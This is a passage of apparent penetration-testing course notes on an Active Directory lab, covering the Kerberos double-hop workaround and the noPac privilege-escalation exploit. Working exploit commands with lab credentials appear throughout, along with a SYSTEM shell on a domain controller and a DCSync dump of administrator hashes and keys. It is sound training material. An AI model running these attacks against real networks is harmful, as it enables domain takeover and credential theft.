        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 6/28/2022 9:13:38 (local)
        End Time:   6/28/2022 19:13:38 (local)
        Renew Time: 7/5/2022 9:13:38 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: DC01.INLANEFREIGHT.LOCAL

#2>     Client: backupadm @ INLANEFREIGHT.LOCAL
        Server: ProtectedStorage/DC01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 6/28/2022 9:13:38 (local)
        End Time:   6/28/2022 19:13:38 (local)
        Renew Time: 7/5/2022 9:13:38 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC01.INLANEFREIGHT.LOCAL

#3>     Client: backupadm @ INLANEFREIGHT.LOCAL
        Server: cifs/DC01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 6/28/2022 9:13:38 (local)
        End Time:   6/28/2022 19:13:38 (local)
        Renew Time: 7/5/2022 9:13:38 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC01.INLANEFREIGHT.LOCAL
```

#### #2 Register PSSession Configuration

You've seen what you can do to overcome this problem when using a tool such as evil-winrm to connect to a host via WinRM. What if you're on a domain-joined host and can connect remotely to another using WinRM? Or you are working from a Windows attack host and connect to your target via WinRM using the ```Enter-PSSession```-cmdlet?

Starty by first establishing a WinRM session on the remote host.

```powershell
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm
```

If you check for cached tickets using ```klist```, you'll see that the same problem exists. Due to the double hop problem, you can only interact with resources in your current session but cannot access the DC directly using PowerView. You can see that your current TGS is good for accessing the HTTP service on the target since you connected over WinRM, which uses SOAP requests in XML format to communicate over HTTP, so it makes sense.

```powershell
[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> klist

Current LogonId is 0:0x11e387

Cached Tickets: (1)

#0>     Client: backupadm @ INLANEFREIGHT.LOCAL
       Server: HTTP/ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
       KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
       Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
       Start Time: 6/28/2022 9:09:19 (local)
       End Time:   6/28/2022 19:09:19 (local)
       Renew Time: 0
       Session Key Type: AES-256-CTS-HMAC-SHA1-96
       Cache Flags: 0x8 -> ASC
       Kdc Called:
```

You also cannot interact directly with the DC using PowerView.

```powershell
[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> Import-Module .\PowerView.ps1
[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> get-domainuser -spn | select samaccountname

Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
"
At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
+             else { $Results = $UserSearcher.FindAll() }
+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
   + FullyQualifiedErrorId : DirectoryServicesCOMException
```

One trick you can use here is registering a new session configuration using the ```Register-PSSessionConfiguration```-cmdlet.

```powershell
PS C:\htb> Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm

 WARNING: When RunAs is enabled in a Windows PowerShell session configuration, the Windows security model cannot enforce
 a security boundary between different user sessions that are created by using this endpoint. Verify that the Windows
PowerShell runspace configuration is restricted to only the necessary set of cmdlets and capabilities.
WARNING: Register-PSSessionConfiguration may need to restart the WinRM service if a configuration using this name has
recently been unregistered, certain system data structures may still be cached. In that case, a restart of WinRM may be
 required.
All WinRM sessions connected to Windows PowerShell session configurations, such as Microsoft.PowerShell and session
configurations that are created with the Register-PSSessionConfiguration cmdlet, are disconnected.

   WSManConfig: Microsoft.WSMan.Management\WSMan::localhost\Plugin

Type            Keys                                Name
----            ----                                ----
Container       {Name=backupadmsess}                backupadmsess
```

Once this is done, you need to restart the WinRM service by typing ```Restart-Servie WinRM``` in your current PSSession. This will kick you out, so you'll start a new PSSession using the named registered session you set up previously.

After you start the session, you can see that the double hop problem has been eliminated, and if you type ```klist```, you'll have the cached tickets necessary to reach the DC. This works because your local machine will now impersonate the remote machine in the context of the backupadm user and all requests from your local machine will be sent directly to the DC.

```powershell
PS C:\htb> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
[DEV01]: PS C:\Users\backupadm\Documents> klist

Current LogonId is 0:0x2239ba

Cached Tickets: (1)

#0>     Client: backupadm @ INLANEFREIGHT.LOCAL
       Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
       KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
       Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
       Start Time: 6/28/2022 13:24:37 (local)
       End Time:   6/28/2022 23:24:37 (local)
       Renew Time: 7/5/2022 13:24:37 (local)
       Session Key Type: AES-256-CTS-HMAC-SHA1-96
       Cache Flags: 0x1 -> PRIMARY
       Kdc Called: DC01
```

You can now run tools such as PowerView without having to create a new PSCredential object.

```powershell
[DEV01]: PS C:\Users\Public> get-domainuser -spn | select samaccountname

samaccountname
--------------
azureconnect
backupjob
krbtgt
mssqlsvc
sqltest
sqlqa
sqldev
mssqladm
svc_sql
sqlprod
sapsso
sapvc
vmwarescvc
```

## Bleeding Edge Vulnerabilities

### NoPac (_SamAccountName Spoofing_)

The [Sam_The_Admin vulnerability](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699), also called noPac or referred to as SamAccountName Spoofing, encompasses two CVEs (_2021-42278 and 2021-42287_) and allows for intra-domain privesc from any standard domain user to Domain Admin level access in one single command.

This exploit path takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller. By default, authenticated users can add up to ten computers to a domain. When doing so, you change the name of the new host to match a DC's SamAccountName. Once done, you must request Kerberos tickets causing the service to issue you tickets under the DC's name instead of the new name. When a TGS is requested, it will issue the ticket with the closest matching name. Once done, you will have access as that service and can even be provided with a SYSTEM shell on a DC. The flow of the attack is outlined [here](https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware).

You can use this [tool](https://github.com/Ridter/noPac) to perform the attack.

NoPac uses many tools in Impacket to communicate with, upload a payload, and issue commands from the attack host to the target DC. Before attempting to use the exploit, you should ensure Impacket is installed and the noPac exploit repo is cloned to your attack host if needed.

Once Impacket is installed and you ensure the repo is cloned to your attack box, you can use the scripts in the NoPac dir to check if the system is vulnerable using a scanner then use the exploit to gain a shell as NT AUTHORITY/SYSTEM. You can use the scanner with a standard domain user account to attempt to obtain a TGT from the target DC. If successful, this indicates the system is, in fact, vulnerable. You'll also notice the ms-DS-MachineAccountQuota number is set to 10. In some environments, an astute sysadmin may set the ms-DS-MachineAccountQuota value to 0. If this is the case, the attack will fail because your user will not have the rights to add a new machine account. Setting this to 0 can prevent quite a few AD attacks.

#### Scanning for NoPac

```bash
d41y@htb[/htb]$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
                                           
[*] Current ms-DS-MachineAccountQuota = 10
[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663
```

#### Running NoPac & Getting a Shell

There are many different ways to use NoPac to further your access. One way is to obtain a shell with SYSTEM level privileges. You can do this by running noPac.py with the syntax below to impersonate the built-in administrator account and drop into a semi-interactive shell session on the target DC. This could be "noisy" or may be blocked by AV or EDR.

```bash
d41y@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
                                               
[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] will try to impersonat administrator
[*] Adding Computer Account "WIN-LWJFQMAXRVN$"
[*] MachineAccount "WIN-LWJFQMAXRVN$" password = &A#x8X^5iLva
[*] Successfully added machine account WIN-LWJFQMAXRVN$ with password &A#x8X^5iLva.
[*] WIN-LWJFQMAXRVN$ object = CN=WIN-LWJFQMAXRVN,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
[*] WIN-LWJFQMAXRVN$ sAMAccountName == ACADEMY-EA-DC01
[*] Saving ticket in ACADEMY-EA-DC01.ccache
[*] Resting the machine account to WIN-LWJFQMAXRVN$
[*] Restored WIN-LWJFQMAXRVN$ sAMAccountName to original value
[*] Using TGT from cache
[*] Impersonating administrator
[*] 	Requesting S4U2self
[*] Saving ticket in administrator.ccache
[*] Remove ccache of ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Rename ccache with target ...
[*] Attempting to del a computer with the name: WIN-LWJFQMAXRVN$
[-] Delete computer WIN-LWJFQMAXRVN$ Failed! Maybe the current user does not have permission.
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>
```

You will notice that a semi-interactive shell session is established with the target using smbexec.py. Keep in mind with smbexec shells you will need to use exact paths instead of navigating the directory structure using ```cd```.

#### Confirming the Location of Saved Tickets

It is important to note that NoPac.py does save the TGT in the directory on the attack host where the exploit was run. You can use ```ls``` to confirm.

```bash
d41y@htb[/htb]$ ls

administrator_DC01.INLANEFREIGHT.local.ccache  noPac.py   requirements.txt  utils
README.md  scanner.py
```

#### Using noPac to DCSync the Built-in Administrator Account

You could then use the ccache file to perform a PtT and perform further attacks such as DCSync. You can also use the tool with the ```-dump``` flag to perform a DCSync using secretsdumpy.py. This method would still create a ccache file on disk, which you would want to be aware of and clean up.

```bash
d41y@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
                                                                    
[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] will try to impersonat administrator
[*] Alreay have user administrator ticket for target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
[*] Kerberos keys grabbed
inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
[*] Cleaning up...
```

### Windows Defender & SMBEXEC.py Considerations

If Windows Defender is enabled on a target, your shell session may be established, but issuing any commands will likely fail. The first thing smbexec.py does is create a service called "BTOBTO". Another service called "BTOBO" is created, and any command you type is sent to the target over SMB inside a .bat file called execute.bat. With each new command you type, a new batch script is created an echoed to a temporary file that executes said script and deletes it from the system.

![ad extras 5](../../../../images/ad_extras5.png)

If OPSEC or being "quiet" is a consideration during an assessment, you would most likely want to avoid a tool like smbexec.py.

### PrintNightmare

